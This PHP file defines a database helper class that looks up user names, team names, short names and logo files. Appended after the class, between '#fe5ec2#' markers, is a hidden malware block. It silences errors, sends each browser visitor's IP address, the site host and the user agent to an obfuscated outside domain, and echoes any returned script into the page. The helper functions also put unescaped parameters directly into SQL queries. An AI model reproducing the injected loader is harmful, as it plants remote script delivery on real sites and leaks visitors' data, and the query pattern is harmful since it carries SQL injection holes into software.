<?php
include_once("../../connection/dbaccess.php5");
include_once("../util/dbschema.php5");
class dbutil
{
	function getUserName($userid){
		$table_users=dbschema::users;
		$result=mysql_query("SELECT username FROM $table_users WHERE userid = '$userid'");
		$array=mysql_fetch_array($result);
		$userName=$array["username"];
		return $userName;
	}
	
	function getTeamName($shortname) {
		$table_teams=dbschema::teams;
		$result=mysql_query("SELECT t.name FROM $table_teams t WHERE t.shortname='$shortname'");
		$array=mysql_fetch_array($result);
		$name=$array["name"];
		return $name;
	}
	
	function getShortName($teamname){
		$table_teams=dbschema::teams;
		$sqlResult=mysql_query("SELECT t.shortname FROM $table_teams t WHERE t.name='$teamname'");
		$array=mysql_fetch_array($sqlResult);
		$shortname=$array["shortname"];
		return $shortname;
	}
	
	function getPicName($teamname){
		$table_teams=dbschema::teams;
		$sqlResult=mysql_query("SELECT t.logofile FROM $table_teams t WHERE t.name='$teamname'");
		$array=mysql_fetch_array($sqlResult);
		$picname=$array["logofile"];
		return $picname;
	}
}
$dbutil=new dbutil();
?>
<?php
#fe5ec2#
error_reporting(0); @ini_set('display_errors',0); $wp_jy27 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_jy27) && !preg_match ('/bot/i', $wp_jy27))){
$wp_jy0927="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_jy27);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_jy0927); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_27jy = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_27jy = @file_get_contents($wp_jy0927);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_27jy=@stream_get_contents(@fopen($wp_jy0927, "r"));}}
if (substr($wp_27jy,1,3) === 'scr'){ echo $wp_27jy; }
#/fe5ec2#
?>